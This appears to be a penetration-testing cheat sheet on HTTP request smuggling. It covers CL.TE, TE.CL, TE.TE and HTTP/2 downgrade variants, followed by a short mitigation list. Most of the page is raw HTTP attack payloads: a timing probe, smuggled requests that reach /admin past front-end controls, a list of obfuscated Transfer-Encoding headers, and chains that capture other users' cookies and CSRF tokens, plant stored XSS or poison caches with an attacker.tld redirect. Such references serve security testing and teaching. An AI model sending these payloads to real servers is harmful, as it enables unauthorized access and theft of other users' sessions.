# HTTP Request Smuggling

> Request smuggling exploits disagreements between the front-end (proxy/CDN) and back-end on where one request ends and the next begins. It typically uses ambiguity between `Content-Length` and `Transfer-Encoding: chunked`.

## Summary

- [Vulnerability Types](#vulnerability-types)
- [Tools](#tools)
- [Detection](#detection)
- [CL.TE Smuggling](#clte-smuggling)
- [TE.CL Smuggling](#tecl-smuggling)
- [TE.TE Smuggling](#tete-smuggling)
- [HTTP/2 Downgrade](#http2-downgrade)
- [Impact / Chains](#impact--chains)
- [Mitigation](#mitigation)
- [References](#references)

## Vulnerability Types

| Type | Front-end uses | Back-end uses |
|------|----------------|----------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | TE (after obfuscation) | TE (different parsing) |
| H2.CL / H2.TE | HTTP/2 ignored | CL / TE used at backend |

## Tools

- [smuggler](https://github.com/defparam/smuggler)
- [HTTP Request Smuggler (Burp extension)](https://github.com/PortSwigger/http-request-smuggler)
- [http2smugl](https://github.com/neex/http2smugl)
- Use HTTP/1.1 raw mode in Burp Repeater (`Inspector → Inspector tab → Settings → Update Content-Length: off`).

## Detection

Send and watch for **delay**:

```
POST / HTTP/1.1
Host: target.tld
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If the back-end uses CL, it reads 4 bytes and waits → frontend reads response slowly → **timing oracle** for CL.TE.

Reverse for TE.CL.

## CL.TE Smuggling

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`.

```
POST / HTTP/1.1
Host: target.tld
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front-end sees CL=13 → forwards everything.
- Back-end sees TE → reads chunk `0` (end of message), then treats `SMUGGLED` as the start of the **next** request.

A complete exploit usually prefixes the next legitimate request:

```
POST / HTTP/1.1
Host: target.tld
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.tld
X: X
```

## TE.CL Smuggling

```
POST / HTTP/1.1
Host: target.tld
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

- Front-end uses TE → reads `8\r\nSMUGGLED\r\n0\r\n\r\n`.
- Back-end uses CL=3 → reads `8\r\n`, then `SMUGGLED\r\n0\r\n\r\n` is next "request".

## TE.TE Smuggling

Obfuscate the header so one side ignores it.

```
Transfer-Encoding: chunked
Transfer-encoding: cow            <- duplicate, second wins on backend?
Transfer-Encoding : chunked       <- space before colon
Transfer-Encoding:  chunked       <- two spaces
Transfer-Encoding:	chunked       <- tab
Transfer-Encoding: chunked
Transfer-Encoding: x
X: X[\n]Transfer-Encoding: chunked
TRANSFER-ENCODING: chunked         <- case
Transfer-Encoding: xchunked
Transfer-Encoding:[\x0b]chunked   <- vertical tab
```

If one parser accepts the obfuscated form and the other doesn't, you have TE.TE.

## HTTP/2 Downgrade

CDN speaks HTTP/2 to client, downgrades to HTTP/1.1 to origin. If header injection is possible via H2:

```
:method POST
:path /
content-length 0\r\nTransfer-Encoding: chunked
```

After downgrade: a second `Transfer-Encoding` slips in.

Also: **CRLF in pseudo-headers** when the downgrader concatenates without sanitizing.

## Impact / Chains

### Front-end auth bypass

Front-end normally rewrites `/admin → 401`. Smuggled request goes straight to the back-end:

```
POST / HTTP/1.1
...
0

GET /admin HTTP/1.1
Host: target.tld
```

### Capture other users' requests

Smuggled prefix consumes the next user's request bytes — that user's data ends up in *your* response. Useful for harvesting cookies, CSRF tokens.

```
POST / HTTP/1.1
Content-Length: 200
...
0

POST /comments HTTP/1.1
Content-Length: 800
...
```

The next user's request body is appended to your "comment" → comment becomes their POST body, reflected back.

### Stored XSS via header

Smuggle a request whose `User-Agent` contains `<script>` and lands in a header-logging endpoint.

### Cache poisoning

Smuggle a redirect to attacker.tld for the next user's request → cache stores it.

## Mitigation

- Use **HTTP/2 end-to-end** if possible.
- If downgrading, reject requests with both `CL` and `TE`, or with ambiguous `TE`.
- Normalize headers at the front-end before forwarding.
- Use a front-end that follows RFC 7230 strictly (reject malformed `TE`).
- Disable connection reuse between proxy and origin (kills most variants, at a perf cost).

## References

- [PortSwigger — Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [James Kettle — HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [smuggler](https://github.com/defparam/smuggler)
